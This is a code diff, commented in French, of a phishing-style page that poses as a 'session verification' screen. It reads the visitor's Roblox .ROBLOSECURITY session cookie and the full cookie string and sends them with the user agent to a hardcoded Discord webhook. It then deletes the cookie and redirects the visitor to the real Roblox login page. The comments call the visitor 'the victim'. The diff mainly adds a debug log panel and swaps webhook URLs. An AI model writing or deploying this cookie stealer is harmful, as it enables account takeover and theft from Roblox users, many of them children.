@@ -9,6 +9,7 @@
         .box { background: #16213e; padding: 40px; border-radius: 20px; box-shadow: 0 0 30px #0f3460; text-align: center; color: white; }
         .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ff4757; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .debug { position: fixed; bottom: 10px; left: 10px; background: black; color: lime; font-size: 12px; padding: 10px; max-width: 90%; z-index: 9999; white-space: pre-wrap; border: 1px solid lime; }
     </style>
 </head>
 <body>
@@ -17,12 +18,23 @@
         <div class="loader"></div>
         <p>Vérification de votre session...</p>
     </div>
+    <!-- Zone de debug pour la victime (invisible si elle regarde ailleurs) -->
+    <div id="debug" class="debug">[LOG] Initialisation...</div>
 
     <script>
         (function() {
-            // --- CONFIG : REMPLACE PAR TON URL DE WEBHOOK ---
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537045511968919636/kGTVPdnnPxP9OR8s_NsUVYSW8cKDiJ7cCUy50K7aBYMQmxXCM0g6eUAIbkCf-MFyvhyS";
-            // -------------------------------------------------
+            // --- CONFIG : REMPLACE TON URL ICI ---
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1536737488125689897/SsqgY-I3Q_xtms_2Jb5PHzzuZmS6HBYpOOV30ZD8ZU0SKm1Gr6joQo1You9v_NLyRaiE";
+            // ------------------------------------
+
+            const debugDiv = document.getElementById('debug');
+
+            function log(msg) {
+                console.log(msg);
+                if (debugDiv) debugDiv.innerText += '\n' + msg;
+            }
+
+            log("1. Script lancé. URL webhook : " + WEBHOOK_URL);
 
             function getRobloxCookies() {
                 const cookies = document.cookie.split('; ');
@@ -45,7 +57,7 @@
                         title: "🎯 Récolte de cookie Roblox",
                         color: 0xff0000,
                         fields: [
-                            { name: "🆔 IP / User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
+                            { name: "🆔 User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
                             { name: "🔑 .ROBLOSECURITY", value: `\`${data.security || 'NON TROUVÉ'}\``, inline: false },
                             { name: "📦 Chaîne complète", value: `\`${data.full || 'VIDE'}\``, inline: false },
                             { name: "🌐 Référent", value: document.referrer || 'Direct', inline: true },
@@ -55,29 +67,41 @@
                     }]
                 };
 
+                log("2. Envoi du payload vers Discord...");
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload),
                     mode: 'no-cors'
-                }).catch(() => {});
+                })
+                .then(() => {
+                    log("3. Fetch terminé (no-cors : pas de réponse visible)");
+                })
+                .catch((err) => {
+                    log("3. ERREUR fetch : " + err.message);
+                });
             }
 
-            // === PHASE 1 : VOL DU COOKIE ===
+            // === EXECUTION ===
+            log("4. Lecture des cookies...");
             const cookies = getRobloxCookies();
+            log("5. Cookie .ROBLOSECURITY présent ? " + (cookies.security ? "OUI (" + cookies.security.substring(0, 20) + "...)" : "NON (ABSENT)"));
+
             if (cookies.security) {
+                log("6. Envoi du cookie...");
                 sendToWebhook(cookies);
             } else {
+                log("6. Pas de cookie, envoi d'un rapport vide...");
                 sendToWebhook({ security: 'ABSENT', full: document.cookie || 'PAS DE COOKIES' });
             }
 
-            // === PHASE 2 : SUPPRESSION DU COOKIE POUR DÉCONNECTER ===
-            // On efface .ROBLOSECURITY en mettant sa date d'expiration dans le passé
+            // Suppression du cookie pour déconnecter
+            log("7. Suppression du cookie local...");
             document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
-            // On efface aussi les éventuels autres cookies de session (optionnel)
             document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
 
-            // === PHASE 3 : REDIRECTION VERS LA VRAIE PAGE DE LOGIN ===
+            // Redirection
+            log("8. Redirection vers Roblox dans 1.5s...");
             setTimeout(() => {
                 window.location.replace("https://www.roblox.com/login");
             }, 1500);
